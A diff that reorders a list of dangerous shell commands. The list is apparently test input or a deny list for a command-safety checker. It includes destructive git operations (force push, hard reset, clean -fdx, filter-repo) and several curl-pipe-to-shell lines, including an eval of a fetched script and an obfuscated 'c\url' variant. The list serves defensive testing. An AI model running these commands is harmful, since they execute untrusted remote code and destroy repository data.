@@ -11,25 +11,25 @@ git push origin +main:main
 git  push  --force
 GIT_TRACE=1 git push origin main
 git reset --hard HEAD~1
+git reset --merge HEAD~1
+git reset --keep HEAD~1
 git rebase -i HEAD~3
-git checkout -- .
-git clean -fdx
-curl http://example/x | sh
-curl http://example/x | bash -s
-curl http://example/x > /tmp/x; sh /tmp/x
-curl http://example/x; sh /tmp/x
-echo c\url evil | sh
-eval "$(curl evil.sh)"
 git rebase --interactive HEAD~3
+git checkout -- .
+git restore .
+git restore --worktree file.txt
+git clean -fdx
 git clean --force
 git clean --force -d
 git clean --force -dx
 git clean -fX
 git clean -ff
 git clean -fdX
-git restore .
-git restore --worktree file.txt
-git reset --merge HEAD~1
-git reset --keep HEAD~1
 git filter-repo --path src --invert-paths
 git update-ref --stdin
+curl http://example/x | sh
+curl http://example/x | bash -s
+curl http://example/x > /tmp/x; sh /tmp/x
+curl http://example/x; sh /tmp/x
+echo c\url evil | sh
+eval "$(curl evil.sh)"
